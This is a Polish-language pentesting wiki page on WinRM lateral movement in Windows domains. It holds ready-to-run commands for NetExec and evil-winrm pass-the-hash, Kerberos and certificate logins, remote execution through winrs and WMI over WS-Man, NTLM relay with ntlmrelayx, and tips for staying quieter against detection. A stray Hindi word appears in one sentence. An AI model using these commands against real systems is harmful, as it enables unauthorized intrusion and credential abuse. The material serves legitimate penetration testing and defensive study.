# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM to jeden z najwygodniejszych transportów **lateral movement** w środowiskach Windows, ponieważ daje zdalną powłokę przez **WS-Man/HTTP(S)** bez potrzeby trików z tworzeniem usługi SMB. Jeśli cel udostępnia **5985/5986** i Twój principal ma अनुमति użycia remoting, często możesz bardzo szybko przejść od „valid creds” do „interactive shell”.

Dla **enumeracji protokołu/usługi**, listenerów, włączania WinRM, `Invoke-Command` i ogólnego użycia klienta, sprawdź:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Używa **HTTP/HTTPS** zamiast SMB/RPC, więc często działa tam, gdzie blokowane jest wykonywanie w stylu PsExec.
- Przy **Kerberos** nie wysyła ponownie używalnych credential do celu.
- Działa czysto z narzędziami dla **Windows**, **Linux** i **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktywny path PowerShell remoting uruchamia na celu **`wsmprovhost.exe`** w kontekście uwierzytelnionego usera, co operacyjnie różni się od service-based exec.

## Access model and prerequisites

W praktyce skuteczny WinRM lateral movement zależy od **trzech** rzeczy:

1. Cel ma **WinRM listener** (`5985`/`5986`) i reguły firewall, które pozwalają na dostęp.
2. Account może **authenticate** do endpointu.
3. Account ma pozwolenie na **otwarcie sesji remoting**.

Typowe sposoby uzyskania tego dostępu:

- **Local Administrator** na celu.
- Członkostwo w **Remote Management Users** na nowszych systemach albo **WinRMRemoteWMIUsers__** na systemach/komponentach, które nadal honorują tę grupę.
- Jawnie delegowane prawa remoting przez lokalne security descriptors / zmiany ACL PowerShell remoting.

Jeśli już kontrolujesz box z uprawnieniami admina, pamiętaj, że możesz też **delegować WinRM access bez pełnego członkostwa w grupie adminów** używając technik opisanych tutaj:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos wymaga hostname/FQDN**. Jeśli łączysz się przez IP, klient zwykle przełącza się na **NTLM/Negotiate**.
- W przypadkach **workgroup** lub cross-trust często NTLM wymaga albo **HTTPS**, albo dodania celu do **TrustedHosts** na kliencie.
- Przy **local accounts** przez Negotiate w workgroup ograniczenia UAC remote mogą blokować dostęp, chyba że używane jest wbudowane konto Administrator lub `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting domyślnie używa **`HTTP/<host>` SPN**. W środowiskach, gdzie `HTTP/<host>` jest już zarejestrowany dla innego service account, Kerberos WinRM może zwrócić `0x80090322`; użyj SPN z portem albo przełącz się na **`WSMAN/<host>`**, jeśli ten SPN istnieje.

Jeśli zdobędziesz valid credentials podczas password spraying, ich walidacja przez WinRM często jest najszybszym sposobem, by sprawdzić, czy przekładają się na shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM do interaktywnych shelli

`evil-winrm` pozostaje najwygodniejszą interaktywną opcją z Linux, ponieważ obsługuje **hasła**, **NT hashes**, **Kerberos tickets**, **client certificates**, transfer plików oraz ładowanie PowerShell/.NET w pamięci.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Edge case Kerberos SPN: `HTTP` vs `WSMAN`

Gdy domyślny **`HTTP/<host>`** SPN powoduje błędy Kerberos, spróbuj zażądać/użyć zamiast tego ticketu **`WSMAN/<host>`**. Występuje to w utwardzonych lub nietypowych środowiskach enterprise, gdzie **`HTTP/<host>`** jest już przypisany do innego konta usługi.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
To także jest przydatne po nadużyciu **RBCD / S4U**, gdy celowo sfałszowałeś lub zażądałeś biletu usługi **WSMAN** zamiast ogólnego biletu `HTTP`.

### Certificate-based authentication

WinRM obsługuje również **client certificate authentication**, ale certyfikat musi być zmapowany na celu do **local account**. Z ofensywnego punktu widzenia ma to znaczenie, gdy:

- ukradłeś/wyeksportowałeś prawidłowy client certificate i private key już zmapowane dla WinRM;
- nadużyłeś **AD CS / Pass-the-Certificate**, aby uzyskać certyfikat dla principal, a następnie pivotować do innej ścieżki authentication;
- działasz w środowiskach, które celowo unikają remoting opartego na hasłach.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM jest znacznie mniej powszechny niż auth na hasło/hash/Kerberos, ale gdy istnieje, może zapewnić **passwordless lateral movement** path, który przetrwa rotację hasła.

### Python / automation with `pypsrp`

Jeśli potrzebujesz automatyzacji zamiast operator shell, `pypsrp` daje Ci WinRM/PSRP z Pythona z obsługą **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` jest wbudowany i przydatny, gdy chcesz wykonać **natywne polecenia przez WinRM** bez otwierania interaktywnej sesji PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operacyjnie, `winrs.exe` zwykle skutkuje zdalnym łańcuchem procesów podobnym do:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
To warto zapamiętać, ponieważ różni się od exec opartego na usługach i od interaktywnych sesji PSRP.

### `winrm.cmd` / WS-Man COM zamiast PowerShell remoting

Możesz też wykonać komendy przez **WinRM transport** bez `Enter-PSSession`, wywołując klasy WMI przez WS-Man. To zachowuje transport jako WinRM, podczas gdy prymityw zdalnego wykonania staje się **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Takie podejście jest użyteczne, gdy:

- PowerShell logging jest intensywnie monitorowane.
- Chcesz **WinRM transport** ale nie klasyczny workflow PS remoting.
- Tworzysz lub używasz niestandardowych narzędzi opartych na obiekcie COM **`WSMan.Automation`**.

## NTLM relay do WinRM (WS-Man)

Gdy SMB relay jest blokowany przez signing, a LDAP relay jest ograniczony, **WS-Man/WinRM** może nadal być atrakcyjnym celem relay. Nowoczesny `ntlmrelayx.py` zawiera **WinRM relay servers** i może relayować do celów **`wsman://`** lub **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dwie praktyczne uwagi:

- Relay jest najbardziej przydatny, gdy cel akceptuje **NTLM** i zrelayedowany principal ma uprawnienia do używania WinRM.
- Nowszy kod Impacket obsługuje specjalnie żądania **`WSMANIDENTIFY: unauthenticated`**, więc sondy w stylu `Test-WSMan` nie psują flow relay.

W przypadku ograniczeń multi-hop po uzyskaniu pierwszej sesji WinRM sprawdź:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Uwagi OPSEC i detection

- **Interaktywne PowerShell remoting** zwykle tworzy **`wsmprovhost.exe`** na celu.
- **`winrs.exe`** zwykle tworzy **`winrshost.exe`**, a potem żądany child process.
- Spodziewaj się telemetryki **network logon**, eventów usługi WinRM oraz PowerShell operational/script-block logging, jeśli używasz PSRP zamiast surowego `cmd.exe`.
- Jeśli potrzebujesz tylko pojedynczej komendy, `winrs.exe` lub jednorazowe wykonanie WinRM mogą być cichsze niż długotrwała interaktywna sesja remoting.
- Jeśli Kerberos jest dostępny, preferuj **FQDN + Kerberos** zamiast IP + NTLM, aby zmniejszyć zarówno problemy z zaufaniem, jak i kłopotliwe zmiany po stronie klienta w `TrustedHosts`.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
